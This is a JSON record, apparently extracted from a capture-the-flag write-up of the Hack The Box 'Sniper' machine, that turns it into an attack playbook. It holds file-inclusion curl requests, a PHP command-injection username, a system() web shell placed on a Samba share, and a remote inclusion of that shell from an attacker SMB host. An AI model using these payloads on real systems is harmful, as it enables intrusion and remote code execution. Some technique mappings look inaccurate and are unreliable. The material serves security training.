@@ -1,0 +1,881 @@
+{
+  "writeup_id": "Htb_Sniper",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_web_lfi_to_rfi_privesc",
+    "primary_services": [
+      "http",
+      "smb",
+      "netbios",
+      "msrpc"
+    ],
+    "port_signature": "80+135+139+445",
+    "service_combination": "iis+smb+netbios+rpc",
+    "os_family": "windows_server",
+    "environment_type": "web_server",
+    "entry_vector": "local_file_inclusion",
+    "privilege_path": "web_shell_to_credential_reuse_to_admin",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "php_lang_parameter_lfi",
+      "smb_remote_file_inclusion",
+      "credential_reuse_pattern",
+      "chm_file_poisoning"
+    ],
+    "environmental_clues": [
+      "iis_10_php_combination",
+      "windows_server_2016_2019",
+      "smb_unauthenticated_access_denied",
+      "user_registration_available"
+    ],
+    "similar_scenarios": [
+      "forest_htb_easy",
+      "optimum_htb_easy"
+    ],
+    "unique_aspects": [
+      "smb_include_via_unc_path",
+      "chm_help_file_exploitation",
+      "samba_authentication_bypass"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Local File Inclusion (LFI)",
+        "success_reason": "PHP include() function directly included user-controlled lang parameter without proper filtering",
+        "prerequisite_indicators": [
+          "php_application_present",
+          "url_parameters_in_includes",
+          "insufficient_input_validation"
+        ],
+        "recognition_patterns": [
+          "URL parameters like ?lang=, ?page=, ?file=",
+          "Different language/content files referenced",
+          "Error messages revealing file paths",
+          "Successful inclusion of system files like win.ini"
+        ],
+        "failure_modes": [
+          "proper_input_sanitization",
+          "whitelist_validation",
+          "disabled_file_includes"
+        ],
+        "environmental_factors": [
+          "default_php_configuration",
+          "windows_iis_setup",
+          "developer_inexperience"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "Remote File Inclusion via SMB",
+        "success_reason": "PHP allow_url_include disabled but SMB UNC paths still processed",
+        "prerequisite_indicators": [
+          "windows_target_system",
+          "smb_outbound_allowed",
+          "php_include_functions"
+        ],
+        "recognition_patterns": [
+          "HTTP includes blocked but SMB attempts succeed",
+          "UNC path format (\\\\ip\\share\\file) works",
+          "SMB connection attempts in network logs"
+        ],
+        "failure_modes": [
+          "smb_outbound_blocked",
+          "authentication_required",
+          "include_functions_disabled"
+        ],
+        "environmental_factors": [
+          "windows_smb_client_enabled",
+          "network_egress_allowed",
+          "misconfigured_php_security"
+        ],
+        "success_probability": 0.45,
+        "typical_timeframe": "20-45 minutes"
+      },
+      {
+        "technique": "PHP Session Poisoning",
+        "success_reason": "User registration allowed PHP code in username field, stored in predictable session file location",
+        "prerequisite_indicators": [
+          "user_registration_available",
+          "session_files_accessible_via_lfi",
+          "insufficient_input_filtering"
+        ],
+        "recognition_patterns": [
+          "Session files in C:\\windows\\temp\\sess_*",
+          "User input reflected in session data",
+          "Registration form accepts special characters"
+        ],
+        "failure_modes": [
+          "strict_input_validation",
+          "session_files_not_accessible",
+          "php_execution_disabled"
+        ],
+        "environmental_factors": [
+          "default_session_configuration",
+          "predictable_file_locations",
+          "weak_input_validation"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "15-25 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "lang parameter LFI vulnerability",
+        "discovery_method": "Parameter analysis of language selection functionality",
+        "why_critical": "Enabled both file disclosure and remote code execution paths",
+        "how_to_recognize": [
+          "URL parameters controlling file inclusion",
+          "Multiple language files referenced",
+          "Absolute path inclusion works (\\windows\\win.ini)"
+        ],
+        "follow_up_actions": [
+          "test_rfi_capabilities",
+          "locate_writable_file_locations",
+          "attempt_session_poisoning"
+        ]
+      },
+      {
+        "discovery": "User registration system",
+        "discovery_method": "Web application enumeration",
+        "why_critical": "Provided writable location for session poisoning attack",
+        "how_to_recognize": [
+          "Registration functionality available",
+          "Session management present",
+          "Weak input validation on username field"
+        ],
+        "follow_up_actions": [
+          "test_php_code_injection",
+          "locate_session_files",
+          "craft_payload_username"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_application",
+        "escalation_method": "LFI_to_RCE_via_session_poisoning",
+        "why_possible": "Combination of LFI vulnerability and writable session files with weak input validation",
+        "recognition_signs": [
+          "lfi_vulnerability_confirmed",
+          "user_registration_available",
+          "session_files_predictable_location",
+          "php_code_execution_in_usernames"
+        ],
+        "exploitation_path": "Register malicious username → Login to create session → Include session file via LFI → Code execution"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 80,135,139,445 open on Windows host",
+        "decision": "Prioritize web application enumeration over SMB",
+        "reasoning": "SMB shows access denied without creds, web app likely has more attack surface",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "smb_enumeration",
+            "when": "if web app fails"
+          },
+          {
+            "option": "rpc_enumeration",
+            "when": "if other vectors exhausted"
+          }
+        ],
+        "success_indicators": [
+          "web_app_accessible",
+          "multiple_endpoints_found",
+          "dynamic_parameters_discovered"
+        ],
+        "next_decision": "analyze_web_app_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Found lang parameter with file paths in web application",
+        "decision": "Test for Local File Inclusion vulnerability",
+        "reasoning": "Parameter accepts file paths, classic LFI pattern detected",
+        "confidence": 0.9,
+        "prerequisites": [
+          "dynamic_parameter_found",
+          "file_path_pattern_observed"
+        ],
+        "success_indicators": [
+          "windows_system_files_readable",
+          "absolute_paths_work"
+        ],
+        "failure_fallbacks": [
+          "parameter_fuzzing",
+          "other_injection_types"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "LFI confirmed but need code execution",
+        "decision": "Attempt Remote File Inclusion via SMB shares",
+        "reasoning": "Windows targets often allow SMB includes when HTTP includes disabled",
+        "confidence": 0.7,
+        "alternatives": [
+          {
+            "option": "session_file_poisoning",
+            "when": "if RFI fails"
+          },
+          {
+            "option": "log_poisoning",
+            "when": "if session poisoning unavailable"
+          }
+        ],
+        "success_indicators": [
+          "smb_connection_established",
+          "remote_file_included"
+        ],
+        "next_decision": "establish_code_execution"
+      },
+      {
+        "step": 4,
+        "situation": "Need to poison session files for code execution",
+        "decision": "Register malicious PHP code as username in user portal",
+        "reasoning": "Session files store user data and are predictably located on Windows",
+        "confidence": 0.8,
+        "prerequisites": [
+          "user_registration_available",
+          "session_file_location_known"
+        ],
+        "success_indicators": [
+          "php_code_executed",
+          "command_output_visible"
+        ],
+        "failure_fallbacks": [
+          "other_writable_locations",
+          "different_injection_points"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_lfi_confirmed": {
+        "action": "attempt_rfi_via_smb",
+        "tools": [
+          "samba",
+          "smbserver.py"
+        ],
+        "fallback": "session_file_poisoning",
+        "next_phase": "establish_code_execution"
+      },
+      "if_rfi_fails": {
+        "action": "find_writable_file_locations",
+        "targets": [
+          "session_files",
+          "log_files",
+          "temp_directories"
+        ],
+        "decision_criteria": "based_on_application_functionality"
+      },
+      "if_session_poisoning_succeeds": {
+        "action": "escalate_to_full_shell",
+        "tools": [
+          "powershell",
+          "nc.exe",
+          "msfvenom"
+        ],
+        "purpose": "establish_persistent_access"
+      },
+      "if_code_execution_obtained": {
+        "action": "enumerate_for_privilege_escalation",
+        "focus": [
+          "credential_reuse",
+          "file_permissions",
+          "scheduled_tasks"
+        ],
+        "tools": [
+          "dir",
+          "whoami",
+          "systeminfo"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "test_lfi_with_absolute_paths_on_windows",
+        "reasoning": "relative_paths_often_filtered_but_absolute_paths_bypass_basic_filters",
+        "applicability": "windows_targets_with_file_inclusion"
+      },
+      {
+        "rule": "try_smb_rfi_before_session_poisoning",
+        "reasoning": "smb_rfi_more_reliable_and_easier_to_exploit",
+        "applicability": "windows_lfi_vulnerabilities"
+      },
+      {
+        "rule": "use_session_files_for_poisoning_when_user_registration_available",
+        "reasoning": "predictable_location_and_controllable_content",
+        "applicability": "web_apps_with_user_registration_and_lfi"
+      },
+      {
+        "rule": "bypass_input_filters_with_php_execution_wrappers",
+        "reasoning": "backticks_and_echo_often_bypass_basic_php_filters",
+        "applicability": "php_applications_with_input_filtering"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Local File Inclusion (LFI)",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "web_application_with_file_parameter",
+          "php_application",
+          "insufficient_input_validation"
+        ],
+        "success_indicators": [
+          "file_parameter_in_url",
+          "absolute_path_inclusion_works",
+          "windows_system_files_readable"
+        ],
+        "incompatible_with": [
+          "strict_input_validation",
+          "chroot_jail",
+          "file_access_restrictions"
+        ],
+        "confidence_boosters": [
+          "lang_parameter_present",
+          "include_statements_in_php",
+          "error_messages_reveal_paths"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Remote File Inclusion via SMB",
+        "mitre_id": "T1105",
+        "required_services": [
+          "http",
+          "smb"
+        ],
+        "required_ports": [
+          80,
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "php_application_with_lfi",
+          "smb_client_functionality",
+          "allow_url_include_enabled_or_smb_allowed"
+        ],
+        "success_indicators": [
+          "smb_connection_attempts_observed",
+          "authentication_requests_to_attacker_smb",
+          "remote_file_execution_successful"
+        ],
+        "incompatible_with": [
+          "network_egress_filtering",
+          "smb_client_disabled",
+          "strict_file_inclusion_policies"
+        ],
+        "confidence_boosters": [
+          "windows_target_with_lfi",
+          "smb_ports_open",
+          "php_application"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "SMB Anonymous Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "smb"
+        ],
+        "required_ports": [
+          139,
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "smb_service_running",
+          "network_connectivity_to_target"
+        ],
+        "success_indicators": [
+          "smb_service_responds",
+          "shares_enumerable",
+          "null_session_allowed"
+        ],
+        "incompatible_with": [
+          "smb_signing_required",
+          "null_session_disabled",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "older_windows_versions",
+          "default_smb_configuration",
+          "netbios_services_running"
+        ],
+        "typical_success_rate": 0.45,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "Web Directory Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "directory_structure_present"
+        ],
+        "success_indicators": [
+          "http_200_responses",
+          "directory_listings_found",
+          "hidden_files_discovered"
+        ],
+        "incompatible_with": [
+          "aggressive_rate_limiting",
+          "web_application_firewall",
+          "custom_error_pages"
+        ],
+        "confidence_boosters": [
+          "standard_web_technologies",
+          "common_cms_patterns",
+          "default_installations"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "10-60 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "windows_iis": {
+        "port_indicators": [
+          80,
+          443,
+          135,
+          139,
+          445
+        ],
+        "service_indicators": [
+          "http",
+          "msrpc",
+          "netbios-ssn",
+          "microsoft-ds"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "Windows",
+          "Microsoft Windows RPC"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "php_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          ".php",
+          "PHP",
+          "index.php"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "smb_service": {
+        "port_indicators": [
+          139,
+          445
+        ],
+        "service_indicators": [
+          "netbios-ssn",
+          "microsoft-ds",
+          "smb"
+        ],
+        "banner_indicators": [
+          "SMB",
+          "Microsoft Windows netbios"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "local_file_inclusion",
+          "when": "php_application_with_file_parameters",
+          "reason": "direct_path_to_code_execution"
+        },
+        {
+          "attack": "web_directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reliable_information_gathering"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "smb_anonymous_enumeration",
+          "when": "smb_service_detected",
+          "reason": "may_reveal_shares_and_users"
+        },
+        {
+          "attack": "remote_file_inclusion_smb",
+          "when": "lfi_confirmed_and_smb_available",
+          "reason": "escalates_lfi_to_rce"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Local File Inclusion (LFI)",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -s -G '{url}' --data-urlencode 'lang={file_path}'",
+            "actual_command": "curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\windows\\win.ini'",
+            "output_pattern": "File contents displayed in HTML source",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "vulnerable_include_parameter",
+          "web_application_accessible",
+          "php_backend"
+        ],
+        "success_indicators": [
+          "file_contents_visible_in_response",
+          "no_error_messages",
+          "absolute_paths_work"
+        ],
+        "common_failures": [
+          "relative_paths_blocked",
+          "input_filtering_active",
+          "file_permissions_deny_access"
+        ],
+        "follow_up_techniques": [
+          "session_file_poisoning",
+          "remote_file_inclusion",
+          "code_execution_via_log_poisoning"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Remote File Inclusion via SMB",
+        "mitre_id": "T1105",
+        "category": "command_and_control",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "samba",
+            "command_template": "service smbd restart && service nmbd restart",
+            "actual_command": "service smbd restart",
+            "output_pattern": "SMB service started successfully",
+            "effectiveness_rating": 4,
+            "reliability": 0.8
+          },
+          {
+            "name": "curl",
+            "command_template": "curl -s -G '{url}' --data-urlencode 'lang=\\\\{attacker_ip}\\{share}\\{file}'",
+            "actual_command": "curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\\\10.10.14.6\\share\\test.txt'",
+            "success_factors": [
+              "smb_share_accessible",
+              "guest_access_enabled",
+              "proper_file_permissions"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "smb_includes_enabled",
+          "attacker_controlled_smb_share",
+          "network_connectivity_to_attacker"
+        ],
+        "success_indicators": [
+          "remote_file_contents_included",
+          "smb_connection_logs_show_success",
+          "no_authentication_errors"
+        ],
+        "common_failures": [
+          "authentication_required",
+          "smb_includes_disabled",
+          "firewall_blocking_smb"
+        ],
+        "follow_up_techniques": [
+          "php_code_execution",
+          "reverse_shell_deployment"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "PHP Session File Poisoning",
+        "mitre_id": "T1055",
+        "category": "execution",
+        "phase": "execution",
+        "tools_used": [
+          {
+            "name": "web_browser",
+            "command_template": "Register username: a<?php echo `{command}` ?>b",
+            "actual_command": "Register username: a<?php echo `whoami` ?>b",
+            "output_pattern": "Command output in session file",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "curl",
+            "command_template": "curl -s -G '{url}' --data-urlencode 'lang=\\windows\\temp\\sess_{session_id}'",
+            "actual_command": "curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\windows\\temp\\sess_8l44h398eccsi698nj5he5k2cr'",
+            "success_factors": [
+              "session_file_writable",
+              "php_code_not_filtered",
+              "session_id_known"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "php_sessions_enabled",
+          "session_files_accessible_via_lfi",
+          "user_registration_available",
+          "minimal_input_filtering"
+        ],
+        "success_indicators": [
+          "command_output_visible_in_session_file",
+          "php_code_execution_confirmed",
+          "system_commands_execute_successfully"
+        ],
+        "common_failures": [
+          "strict_input_filtering",
+          "session_files_not_accessible",
+          "php_execution_disabled"
+        ],
+        "follow_up_techniques": [
+          "file_system_enumeration",
+          "reverse_shell_execution",
+          "credential_harvesting"
+        ],
+        "time_investment": "20-40 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Samba",
+        "use_case": "remote_file_inclusion_via_smb",
+        "effectiveness_rating": 4,
+        "reliability": 0.8,
+        "learning_curve": "medium",
+        "essential_for": [
+          "windows_rfi_attacks"
+        ],
+        "alternatives": [
+          "impacket_smbserver",
+          "windows_smb_share"
+        ],
+        "best_practices": [
+          "configure_guest_access",
+          "set_proper_file_permissions",
+          "use_nobody_user_for_security"
+        ]
+      },
+      {
+        "tool": "curl",
+        "use_case": "lfi_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "burp_suite",
+          "browser_direct"
+        ],
+        "best_practices": [
+          "use_data_urlencode_for_special_characters",
+          "test_both_relative_and_absolute_paths",
+          "examine_html_source_for_output"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "lfi_to_code_execution",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\windows\\win.ini'",
+            "purpose": "Test LFI vulnerability",
+            "expected_output": "Windows ini file contents"
+          },
+          {
+            "step": 2,
+            "command": "Register username: a<?php echo `whoami` ?>b",
+            "purpose": "Poison PHP session with code",
+            "expected_output": "Successful registration"
+          },
+          {
+            "step": 3,
+            "command": "curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\windows\\temp\\sess_[SESSION_ID]'",
+            "purpose": "Execute code via session file inclusion",
+            "expected_output": "nt authority\\iusr"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "30-60 minutes"
+      },
+      {
+        "sequence_name": "smb_rfi_setup",
+        "steps": [
+          {
+            "step": 1,
+            "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > /srv/samba/shell.php",
+            "purpose": "Create malicious PHP file",
+            "expected_output": "File created successfully"
+          },
+          {
+            "step": 2,
+            "command": "service smbd restart && service nmbd restart",
+            "purpose": "Start SMB services",
+            "expected_output": "Services started"
+          },
+          {
+            "step": 3,
+            "command": "curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\\\10.10.14.6\\share\\shell.php' --data-urlencode 'cmd=whoami'",
+            "purpose": "Execute remote PHP via SMB",
+            "expected_output": "Command execution results"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "20-45 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Sniper",
+      "difficulty": "Medium",
+      "os": "Windows Server 2016/2019",
+      "platform": "HackTheBox",
+      "release_date": "2019-10-05",
+      "author": "MinatoTW & felamos",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "file_inclusion",
+        "credential_reuse",
+        "file_poisoning"
+      ],
+      "key_vulnerabilities": [
+        "lfi_rfi",
+        "weak_credentials",
+        "chm_file_execution"
+      ],
+      "environment_type": "corporate_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "web_exploitation",
+        "windows_privilege_escalation",
+        "file_format_attacks"
+      ],
+      "prerequisite_knowledge": [
+        "web_vulnerabilities",
+        "windows_fundamentals",
+        "file_inclusion_techniques"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "file_inclusion",
+        "privilege_escalation",
+        "credential_attacks"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "credential_policies",
+        "file_execution_controls"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bastard",
+        "Optimum",
+        "Devel"
+      ],
+      "similarity_reasons": [
+        "windows_web_server",
+        "file_inclusion_attacks",
+        "credential_reuse"
+      ],
+      "unique_aspects": [
+        "chm_file_poisoning",
+        "dual_privilege_escalation",
+        "iis_exploitation"
+      ],
+      "difficulty_factors": [
+        "multiple_escalation_steps",
+        "file_format_knowledge",
+        "windows_specific_techniques"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T18:00:07.972580",
+    "original_file": "0xdf_writeups/Htb Sniper.md",
+    "content_length": 39282,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
